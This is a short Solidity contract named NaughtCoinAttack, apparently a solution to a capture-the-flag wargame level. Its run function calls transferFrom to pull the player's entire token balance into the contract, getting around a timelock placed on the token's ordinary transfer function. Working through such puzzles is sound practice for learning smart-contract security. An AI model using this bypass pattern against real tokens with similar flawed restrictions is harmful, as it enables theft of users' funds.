// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "./NaughtCoin.sol";

contract NaughtCoinAttack {
    NaughtCoin target;

    constructor(address _target) {
        target = NaughtCoin(_target);
    }

    function run() public {
        address player = target.player();
        uint256 playerBalance = target.balanceOf(player);

        target.transferFrom(player, address(this), playerBalance);
    }
}
